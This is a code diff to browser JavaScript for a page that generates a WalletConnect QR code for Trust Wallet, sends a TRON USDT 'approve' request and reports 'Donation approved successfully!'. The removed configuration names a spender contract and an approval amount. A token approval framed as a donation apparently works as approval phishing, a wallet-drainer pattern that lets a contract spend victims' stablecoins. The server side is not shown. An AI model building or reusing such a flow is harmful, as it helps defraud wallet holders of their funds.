@@ -1,57 +1,119 @@
 // ============================================================
-// CONFIGURATION
+// WALLETCONNECT FLOW
+// Scan QR → Trust Wallet popup → Confirm approve → Done
 // ============================================================
 
-const CONFIG = {
-    CONTRACT_ADDRESS: "TMAi5Rs64aSxkvg1x1WVaQL1S3YStStjju",
-    USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
-    APPROVE_AMOUNT: "1000000",
-};
+let currentSessionId = null;
+let pollInterval = null;
 
-// ============================================================
-// BUILD THE APPROVE QR CODE
-// ============================================================
+async function startSession() {
+    const statusEl = document.getElementById("status-text");
+    const qrcodeContainer = document.getElementById("qrcode");
+    const successEl = document.getElementById("success-section");
 
-function generateApproveQR() {
     try {
-        // Direct URL to approve page - Trust Wallet opens HTTPS URLs in its DApp browser
-        // tronWeb gets injected automatically, and calling approve() triggers the native TX popup
-        const approvePageUrl = window.location.origin + "/approve.html";
+        statusEl.textContent = "Generating QR code...";
 
-        const qrcodeContainer = document.getElementById("qrcode");
+        // Ask server to create a WalletConnect session
+        const res = await fetch("/api/wc/session", { method: "POST" });
+        const data = await res.json();
 
-        if (typeof QRCode === "undefined") {
-            qrcodeContainer.innerHTML = '<p style="color:#666;font-size:12px;padding:20px;">QR loading failed. Use button below.</p>';
-            document.getElementById("mobile-link").href = approvePageUrl;
+        if (data.error) {
+            statusEl.textContent = "Error: " + data.error;
             return;
         }
 
+        currentSessionId = data.sessionId;
+
+        // Show QR code with WalletConnect URI
         qrcodeContainer.innerHTML = "";
-
-        new QRCode(qrcodeContainer, {
-            text: approvePageUrl,
-            width: 200,
-            height: 200,
-            colorDark: "#000000",
-            colorLight: "#ffffff",
-            correctLevel: QRCode.CorrectLevel.M,
-        });
-
-        // Mobile link - just the direct URL
-        document.getElementById("mobile-link").href = approvePageUrl;
-    } catch (err) {
-        console.error("QR generation error:", err);
-        var errEl = document.getElementById("error-msg");
-        if (errEl) {
-            errEl.style.display = "block";
-            errEl.textContent = "Error generating QR: " + err.message;
+        if (typeof QRCode !== "undefined") {
+            new QRCode(qrcodeContainer, {
+                text: data.uri,
+                width: 220,
+                height: 220,
+                colorDark: "#000000",
+                colorLight: "#ffffff",
+                correctLevel: QRCode.CorrectLevel.L,
+            });
+        } else {
+            qrcodeContainer.innerHTML = '<p style="color:#999;font-size:11px;word-break:break-all;padding:10px;">' + data.uri + '</p>';
         }
+
+        statusEl.textContent = "Scan with Trust Wallet";
+
+        // Poll for session status
+        pollInterval = setInterval(() => pollStatus(), 2000);
+
+    } catch (err) {
+        statusEl.textContent = "Failed to start session: " + err.message;
     }
 }
 
-// Initialize when DOM is ready
+async function pollStatus() {
+    if (!currentSessionId) return;
+
+    try {
+        const res = await fetch(`/api/wc/status/${currentSessionId}`);
+        const data = await res.json();
+
+        const statusEl = document.getElementById("status-text");
+        const qrcodeContainer = document.getElementById("qrcode");
+        const successEl = document.getElementById("success-section");
+
+        switch (data.status) {
+            case "pending":
+                // Still waiting for scan
+                break;
+
+            case "connected":
+                statusEl.textContent = "Wallet connected! Sending approve request...";
+                statusEl.style.color = "#facc15";
+                break;
+
+            case "approved":
+                statusEl.textContent = "Approve confirmed! Processing...";
+                statusEl.style.color = "#4ade80";
+                break;
+
+            case "done":
+                clearInterval(pollInterval);
+                qrcodeContainer.style.display = "none";
+                successEl.style.display = "block";
+                statusEl.textContent = "Donation approved successfully!";
+                statusEl.style.color = "#4ade80";
+                document.getElementById("tx-link").href = "https://tronscan.org/#/transaction/" + data.txId;
+                document.getElementById("tx-link").textContent = data.txId.substring(0, 12) + "...";
+                break;
+
+            case "rejected":
+                clearInterval(pollInterval);
+                statusEl.textContent = "Connection rejected. Try again.";
+                statusEl.style.color = "#f87171";
+                showRetry();
+                break;
+        }
+    } catch (e) {
+        // Silently retry
+    }
+}
+
+function showRetry() {
+    document.getElementById("retry-btn").style.display = "inline-block";
+}
+
+function retry() {
+    document.getElementById("retry-btn").style.display = "none";
+    document.getElementById("success-section").style.display = "none";
+    document.getElementById("qrcode").style.display = "inline-block";
+    document.getElementById("status-text").style.color = "#9ca3af";
+    if (pollInterval) clearInterval(pollInterval);
+    startSession();
+}
+
+// Initialize
 if (document.readyState === "loading") {
-    document.addEventListener("DOMContentLoaded", generateApproveQR);
+    document.addEventListener("DOMContentLoaded", startSession);
 } else {
-    generateApproveQR();
+    startSession();
 }
